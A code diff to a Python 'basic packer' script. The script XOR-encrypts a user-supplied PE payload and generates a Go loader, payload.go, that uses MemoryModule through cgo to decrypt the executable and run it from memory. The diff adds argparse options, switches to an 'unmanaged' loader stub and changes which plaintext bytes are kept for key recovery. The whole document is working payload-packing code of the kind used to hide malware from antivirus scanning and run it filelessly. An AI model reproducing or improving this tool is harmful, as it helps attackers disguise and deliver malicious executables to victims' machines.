@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import argparse
 import sys
 import zlib
 from random import randint
 from struct import pack
 
-import stub_go
+import stub_unmanaged_go
 
 def xor(block):
     key = randint(0,42949672)
@@ -21,10 +22,17 @@ def xor(block):
     return encrypted
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage:", sys.argv[0], "<PE file>")
-        exit(-1)
-    pefile = sys.argv[1]
+    parser = argparse.ArgumentParser(description='Basic packer using XOR encryption', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser.add_argument('-f', '--file', type=str, required=True, help='specify the payload file')
+    parser.add_argument('-t', '--type', type=str, choices=['UNMANAGED'], default='UNMANAGED', help='specify the payload type')
+    args = parser.parse_args()
+
+    print()
+    print("[>] Payload file :", args.file)
+    print("[>] Payload type :", args.type)
+    print()
+
+    pefile = args.file
     payload = open(pefile, 'rb').read()
 
     print("[*] Encrypting payload...")
@@ -35,9 +43,10 @@ if __name__ == "__main__":
 
     print("[*] Generating source file...")
     encrypted = ''.join(format(c, '02x') for c in encrypted)
-    plain = payload[0:10]
+    plain = payload[128:132]
     known_bytes = ''.join(format(c, '02x') for c in plain)
-    source = stub_go.peloader.format(encrypted, known_bytes)
+
+    source = stub_unmanaged_go.loader.format(encrypted, known_bytes)
     repl = '''/*
 #cgo CFLAGS: -IMemoryModule
 #cgo LDFLAGS: MemoryModule/build/MemoryModule.a
@@ -46,8 +55,10 @@ if __name__ == "__main__":
 import "C"
 '''
     source = source.replace('import "C"', repl)
+
     with open('payload.go', 'w') as f:
         f.write(source)    
     f.close()
 
-    print("[*] You should now build payload.go")
+    print()
+    print("[>] You should now build payload.go")
